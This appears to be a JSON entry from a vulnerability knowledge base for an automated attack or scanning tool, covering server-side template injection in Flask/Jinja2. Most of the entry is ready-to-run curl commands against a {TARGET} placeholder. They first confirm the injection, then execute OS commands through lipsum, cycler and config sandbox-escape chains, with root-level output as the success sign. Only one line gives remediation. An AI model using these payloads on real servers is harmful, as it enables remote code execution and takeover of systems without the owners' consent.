{
  "vuln_id": "flask_ssti",
  "description": "Flask框架中Jinja2模板引擎因未过滤用户输入导致服务端模板注入，可导致远程代码执行",
  "category": "ssti",
  "cves": [],
  "match_keywords": [
    "Flask",
    "Jinja2",
    "SSTI",
    "Server-Side Template Injection",
    "flask_ssti"
  ],
  "fingerprint_keywords": [
    "Flask",
    "Jinja2",
    "Werkzeug",
    "Python",
    "Gunicorn"
  ],
  "affected_versions": "Flask 1.1.1及可能存在类似漏洞的版本",
  "default_port": 8000,
  "common_endpoints": [
    "/",
    "/?name={payload}"
  ],
  "detection_method": "发送GET请求到http://{TARGET}:8000/?name={{7*7}}，如果响应中包含'49'或'Hello 49'，则存在SSTI漏洞",
  "exploit_steps": [
    {
      "step": 1,
      "description": "验证SSTI漏洞是否存在",
      "command": "curl -s -G --data-urlencode 'name={{7*7}}' http://{TARGET}:8000/",
      "expected_result": "响应中包含'49'或'Hello 49'",
      "notes": "必须使用--data-urlencode避免花括号被shell解释"
    },
    {
      "step": 2,
      "description": "执行远程命令（使用lipsum链）",
      "command": "curl -s -G --data-urlencode \"name={{lipsum.__globals__['os'].popen('id').read()}}\" http://{TARGET}:8000/",
      "expected_result": "响应中包含命令执行结果，如'uid=0(root)'",
      "notes": "Jinja2沙箱中没有__import__，必须使用lipsum、cycler或config链"
    },
    {
      "step": 3,
      "description": "执行远程命令（使用cycler链）",
      "command": "curl -s -G --data-urlencode \"name={{cycler.__init__.__globals__.os.popen('id').read()}}\" http://{TARGET}:8000/",
      "expected_result": "响应中包含命令执行结果",
      "notes": "替代payload，优先级次于lipsum链"
    },
    {
      "step": 4,
      "description": "执行远程命令（使用config链）",
      "command": "curl -s -G --data-urlencode \"name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}\" http://{TARGET}:8000/",
      "expected_result": "响应中包含命令执行结果",
      "notes": "替代payload，优先级次于cycler链"
    }
  ],
  "verification_command": "curl -s -G --data-urlencode \"name={{lipsum.__globals__['os'].popen('id').read()}}\" http://{TARGET}:8000/",
  "verification_success_sign": "响应中包含命令执行结果，如'uid=0(root)'",
  "requires_callback": false,
  "callback_note": "",
  "remediation": "对用户输入进行严格过滤和转义，避免直接将用户输入渲染到模板中",
  "tags": [
    "ssti",
    "rce",
    "python",
    "flask",
    "jinja2",
    "template-injection"
  ],
  "search_text": "Flask框架中Jinja2模板引擎因未过滤用户输入导致服务端模板注入，可导致远程代码执行 ssti Flask Jinja2 SSTI Server-Side Template Injection flask_ssti Flask Jinja2 Werkzeug Python Gunicorn 发送GET请求到http://{TARGET}:8000/?name={{7*7}}，如果响应中包含'49'或'Hello 49'，则存在SSTI漏洞 Flask 1.1.1及可能存在类似漏洞的版本 ssti rce python flask jinja2 template-injection 验证SSTI漏洞是否存在 执行远程命令（使用lipsum链） 执行远程命令（使用cycler链） 执行远程命令（使用config链）",
